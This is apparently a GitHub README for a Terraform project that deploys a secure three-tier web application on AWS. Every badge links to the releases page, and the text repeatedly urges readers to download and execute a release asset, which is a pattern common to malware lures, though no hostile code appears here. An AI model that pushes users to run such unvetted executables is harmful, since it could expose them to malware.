https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases

[![Releases](https://img.shields.io/github/v/release/ea3ifu/Web-Application-Deployement-in-AWS-?label=Releases&color=2b8cff)](https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases)
[![autoscaling](https://img.shields.io/badge/autoscaling--groups-blue)](https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases) [![aws](https://img.shields.io/badge/aws-orange)](https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases) [![vpc](https://img.shields.io/badge/vpc-teal)](https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases) [![rds-postgres](https://img.shields.io/badge/rds--postgres-006400)](https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases)

# Deploy Secure Scalable 3-Tier Web App on AWS with Terraform

![3-tier-architecture](https://upload.wikimedia.org/wikipedia/commons/2/2f/Three-tier_architecture_diagram.svg)

A complete cloud project that builds a secure, scalable three-tier web application on AWS. The repo shows architecture design, infrastructure as code, deployment scripts, monitoring, and runbook items for production use.

Badges link to the release page. Download the release asset and execute it to run the automated deploy. The release page and assets live here:
https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases

Key goals
- Deploy a 3-tier app: load balancer, application tier, and data tier.
- Use autoscaling with EC2 and an Application Load Balancer.
- Host the database on Amazon RDS (Postgres).
- Build the network in a VPC with private subnets and NAT.
- Add monitoring, logging, and secure SSH via a bastion host.

Contents
- Features
- Architecture
- Components and AWS mapping
- Prerequisites
- Quick start (download & run)
- Terraform and CloudFormation usage
- Monitoring and logging
- Security best practices
- Cost and scaling
- Folder layout
- Troubleshooting
- Contributing
- License

Features
- Fully automated infrastructure as code with Terraform and CloudFormation.
- Multi-AZ RDS for high availability.
- Auto Scaling Groups for the app tier with health checks.
- Application Load Balancer with TLS termination.
- Private subnets for app and database layers.
- Bastion host and SSH jump rules for admin access.
- CloudWatch dashboards, alarms, and log aggregation.
- Backup plan for RDS and AMI snapshots.
- Modular code so you can reuse VPC, network, compute, and DB modules.

Architecture overview
- Public layer: ALB in public subnets. Handles TLS and routes traffic to the app tier.
- Application layer: EC2 instances in private subnets inside an Auto Scaling Group. Instances run the web app behind ALB.
- Data layer: Amazon RDS for Postgres in private subnets. The DB uses encrypted storage and automated backups.
- Management and ops: Bastion host in a small public subnet for SSH. CloudWatch for metrics, logs, and alarms.

Components and AWS mapping
- VPC: Isolated network with public and private subnets, route tables, internet gateway, and NAT gateway.
- Security groups: ALB SG, app SG, DB SG, bastion SG. Principle of least privilege.
- Load Balancer: Application Load Balancer (ALB) for HTTP/HTTPS.
- Compute: EC2 instances in an Auto Scaling Group using an AMI configured for the app.
- Session store (optional): ElastiCache (Redis) for session caching.
- Database: Amazon RDS for Postgres with Multi-AZ.
- Monitoring: CloudWatch metrics, logs, dashboards, and CloudWatch Agent on instances.
- Logging: CloudWatch Logs for application and system logs, optional S3 export.
- Secrets: AWS Secrets Manager for DB credentials, rotated on a schedule.
- IaC: Terraform for major resources, CloudFormation for smaller templates or nested stacks.
- CI/CD: Placeholder for GitHub Actions or CodePipeline to build AMIs and deploy app artifacts.

Prerequisites
- AWS account with admin or appropriate IAM rights.
- AWS CLI configured with a profile and region.
- Terraform v1.0+ installed.
- kubectl / docker optional if you containerize the app.
- A domain and ACM certificate if you want TLS with your domain.
- SSH key pair for the bastion and EC2 instances.

Quick start — download and run
1. Visit the releases page and download the main deploy asset. The release contains an automated script and required templates. You must download and execute the release asset from:
   https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases
2. Example commands after download:
   - Unpack release:
     ```
     tar xzf webapp-aws-release.tar.gz
     cd webapp-aws-release
     ```
   - Run the deploy script:
     ```
     chmod +x deploy.sh
     ./deploy.sh --profile my-aws-profile --region us-east-1
     ```
   The release asset contains setup steps, Terraform state backend setup, and optional cleanup.

Terraform usage
- Initialize and plan:
  ```
  terraform init
  terraform plan -out plan.tfplan
  ```
- Apply:
  ```
  terraform apply "plan.tfplan"
  ```
- Destroy:
  ```
  terraform destroy
  ```
- Modules in the repo:
  - network/ (VPC, subnets, NAT, route tables)
  - compute/ (ASG, launch template, user-data)
  - db/ (RDS, subnet group, parameter group)
  - iam/ (roles, instance profiles)
  - monitor/ (CloudWatch dashboards and alarms)

CloudFormation
- Use CloudFormation for nested stacks or specific resource types.
- The repo includes sample CloudFormation templates for ALB listener rules and CloudWatch dashboard creation.

Deployment flow
- Provision VPC and networking.
- Create RDS and secure its access group.
- Launch bastion for admin access.
- Launch AMI-backed Auto Scaling Group.
- Register targets with ALB and create health checks.
- Configure CloudWatch Agent and dashboards.
- Run post-deploy tasks: DB migrations, seed data, register domain and ACM cert.

Security
- Use security groups, not wide-open ports. Only ALB allows 80/443 from public.
- DB allows inbound from the app security group only.
- Use IAM roles for EC2 instances. Do not store credentials on instances.
- Enable encryption at rest for RDS and S3.
- Rotate secrets in AWS Secrets Manager.
- Lock down the bastion to specific admin IPs.
- Enable VPC Flow Logs for audit and incident response.

Monitoring and logging
- CloudWatch collects metrics for EC2, ALB, RDS, and Autoscaling.
- Logs:
  - System and app logs go to CloudWatch Logs.
  - RDS logs export to CloudWatch Logs for postgres error and slow query logs.
- Alerts:
  - CPU and memory alarms for ASG instances.
  - ALB 5xx rate alert.
  - RDS storage and replica lag alarms.
- Dashboard:
  - Summary dashboard: request count, latency, error rate, DB CPU, DB connections, ASG desired/available.

Scaling and cost control
- Use ASG scaling policies based on average CPU and request count per target.
- Use target tracking and step scaling for predictable growth.
- Use spot instances for non-critical workers or batch jobs to cut costs.
- Use reserved instances or savings plans for steady baseline load.
- Monitor CloudWatch billing metrics and set cost alarms.

Backup and recovery
- RDS automated backups with retention window set by policy.
- RDS snapshots before schema upgrades.
- AMI snapshots for instances before major changes.
- S3 lifecycle for logs and artifacts.

CI/CD and immutability
- Build AMIs with Packer. Bake latest app and dependencies.
- Use GitHub Actions or AWS CodePipeline for CI. Trigger image or AMI build on push to main.
- Promote AMIs to production via Terraform variable that selects AMI ID.

Folder layout (example)
- /terraform
  - /modules
    - vpc/
    - compute/
    - db/
    - iam/
  - main.tf
  - variables.tf
  - outputs.tf
- /cloudformation
  - alb-listener.yaml
  - cloudwatch-dashboard.yaml
- /scripts
  - deploy.sh
  - bootstrap.sh
  - backup-db.sh
- /ansible (optional)
  - playbooks/
- /docs
  - runbook.md
  - architecture.md

Troubleshooting
- ALB shows 503: Check target health. Confirm app listens on expected port and user-data configured.
- EC2 in ASG keep failing: Inspect instance system logs in CloudWatch for user-data errors and missing IAM permissions.
- RDS connection refused: Confirm security groups allow traffic from app SG and that DB is in private subnets.
- Terraform state lock: Check backend S3/DynamoDB locks and force-unlock when safe.
- High latency: Check DB CPU, slow queries, and ALB target response times.

Releases
- Automated release assets contain deploy scripts, sample Terraform state backend config, and prebuilt AMI IDs for supported regions.
- Download and execute the release asset to run the automated setup. Releases live here:
  https://github.com/ea3ifu/Web-Application-Deployement-in-AWS-/releases
- If a release link fails in your environment, check the repository "Releases" section on GitHub for assets and instructions.

Contributing
- Open an issue for bugs or feature requests.
- Fork the repo, create a branch per feature, and submit a pull request with tests or deploy notes.
- Follow the module pattern. Keep resources modular and reusable.

Contact and support
- Use the repo Issues tab for technical questions and bug reports.
- Include Terraform plan output and relevant logs when you open an issue.

License
- MIT License. Check LICENSE file in the repo for full terms.